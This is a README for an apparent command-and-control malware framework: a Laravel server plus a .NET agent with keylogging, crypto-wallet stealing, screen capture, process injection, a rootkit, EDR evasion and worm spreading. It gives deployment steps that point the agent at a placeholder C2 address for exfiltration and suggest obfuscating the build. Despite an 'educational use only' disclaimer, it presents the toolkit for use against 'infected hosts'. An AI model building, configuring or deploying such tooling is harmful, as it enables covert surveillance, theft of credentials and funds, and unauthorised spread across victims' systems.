# 📡 Project X - Advanced Red Team C2 & Telemetry Framework

> **⚠️ WORK IN PROGRESS / BETA**
>
> This software is currently under active development. Modules may behave unexpectedly. Not all features are production-ready.
>
> **🚨 EDUCATIONAL USE ONLY**: This codebase was created for cybersecurity research, malware analysis training, and red teaming simulations. The author disclaims any responsibility for misuse.

---

## 🏛️ System Architecture

Project X is a sophisticated Command & Control (C2) framework designed for high-fidelity telemetry, remote management, and advanced post-exploitation tasks. It consists of a robust Laravel-based backend and a highly modular C# .NET agent.

```mermaid
graph TD
    subgraph "Target Environment (XYZ Agent)"
        A[🤖 DaemonCore]
        A -->|Modular Loading| M1[Keylogger] & M2[ScreenRec] & M3[NetSniffer]
        A -->|Modular Loading| M4[CryptoStealer] & M5[WebRTC] & M6[Rootkit/Evasion]
        
        M1 & M2 & M3 & M4 -.->|Aggregated Reports| T[Telemetry Module]
        T -->|Batch Upload| API[API Gateway]
        
        M5 <-->|P2P Stream| DASH[Web Dashboard]
    end

    subgraph "C2 Infrastructure (Laravel)"
        API -->|Authentication & Validation| CTRL[C2 Controller]
        
        CTRL -->|Structured Data| DB[(MySQL Database)]
        CTRL -->|Binary Data| FS[File System /storage/app/c2_data]
        
        DB & FS -->|Real-time Stats| VIEW[Admin Dashboard]
    end
```



---

## 📦 XYZ Agent Capabilities (Client Side)

The **XYZ Agent** is a modular .NET framework designed for resilience and stealth.

### Core Modules
| Module | Description | Status |
|:-------|:------------|:-------|
| **DaemonCore** | Main orchestration engine, handles heartbeat and task scheduling. | ✅ Active |
| **ResilientComm** | Handles fallback channels and connection retries. | ✅ Active |
| **Persistence** | Ensures survival across reboots (Registry, Tasks, Services). | ✅ Active |
| **PluginLoader** | Dynamically loads additional DLLs/Modules from memory. | ⚠️ Beta |

### Surveillance & Data Collection
| Module | Description |
|:-------|:------------|
| **AdvancedKeylogger** | Captures keystrokes, clipboard, and active window titles. |
| **ScreenRecording** | Takes periodic screenshots or streams video via WebRTC. |
| **NetworkSniffer** | Monitors HTTP/TCP traffic for interesting patterns. |
| **CryptoStealer** | Scans for wallet addresses and browser extensions. |

### Offensive Operations
| Module | Description |
|:-------|:------------|
| **ProcessInjection** | Injects payloads into legitimate processes (e.g., explorer.exe). |
| **RootkitDriver** | Kernel-mode driver for hiding processes and files (Experimental). |
| **EDR Evasion** | Techniques to bypass Antivirus/EDR hooks. |
| **WormModule** | Lateral movement capabilities (Shared Drives, USB Autorun). |

---

## 🖥️ C2 Server Capabilities (Server Side)

The **C2 Server** is built on Laravel 10+, providing a scalable API and a modern Dashboard.

### Dashboard Features
- **Real-Time Telemetry**: Live updating charts for Network Activity, OS Distribution, and Alerts.
- **Terminal Management**: Detailed view of each infected host (HWID, IP, User, Privileges).
- **Hybrid Storage Engine**:
  - **Database (MySQL)**: Stores indexable metadata, session status, and text logs for fast queries.
  - **Flat File System**: Stores heavy binaries (screenshots, zipped logs) in organized directories (`/storage/app/c2_data/`).
- **WebRTC Interceptor**: Interface to view live streams from agents.
- **Command Queue**: Queue Shell/PowerShell commands to be executed by specific agents.

### API Endpoints (`/api`)
- `POST /status`: Heartbeat with basic machine info.
- `POST /telemetry/batch`: Bulk upload of collected logs (Keylog, Crypto, Net).
- `POST /webrtc/*`: Signaling server for P2P connection establishment.
- `POST /upload`: Receiver for exfiltrated files and screenshots.

---

## 🚀 Installation & Deployment

### 1. C2 Server (Backend)

**Requirements**: PHP 8.1+, Composer, Node.js, MySQL.

```bash
# 1. Clone & Setup
cd c2/c2
composer install
npm install && npm run build

# 2. Configuration
cp .env.example .env
# EDIT .env with your DB credentials

# 3. Database & Storage
php artisan key:generate
php artisan migrate
php artisan storage:link
# Ensure write permissions for: storage/app/c2_data

# 4. Start
php artisan serve
```

### 2. XYZ Agent (Build)

**Requirements**: Visual Studio 2022, .NET Framework 4.7.2+

1.  Open **`XYZ.sln`** in Visual Studio.
2.  Navigate to `Modules/Config.cs` (or equivalent configuration file).
3.  Set the **C2 URL**:
    ```csharp
    public static string C2Host = "http://YOUR_C2_IP:8000/api";
    ```
4.  Build in **Release** mode to minimize size and remove debug consoles.
5.  (Optional) Use an Obfuscator (e.g., ConfuserEx) before deployment.

---

## 🔧 File Structure

```text
/
├── c2/                     # C2 Server Source
│   ├── c2/                 # Laravel Application
│   │   ├── app/            # Controllers, Models, Services
│   │   ├── database/       # Migrations (Schema definitions)
│   │   └── resources/      # Blade Views (Admin Dashboard)
│
├── XYZ/                    # Agent Source
│   ├── modules/            # Individual Feature Modules
│   │   ├── DaemonCore.cs
│   │   ├── Keylogger.cs
│   │   └── ...
│   ├── Program.cs          # Entry Point
│   └── Properties/         # Assembly Info
│
└── README.md               # Documentation
```

---

## ⚠️ Known Issues / WIP

*   **Rootkit Module**: The kernel driver requires test-signing to be enabled on Windows.
*   **WebRTC**: STUN/TURN servers are currently hardcoded; might fail behind strict NATs.
*   **Worm**: USB propagation is disabled by default to prevent accidental spread.

---

**Research Project | 2025**
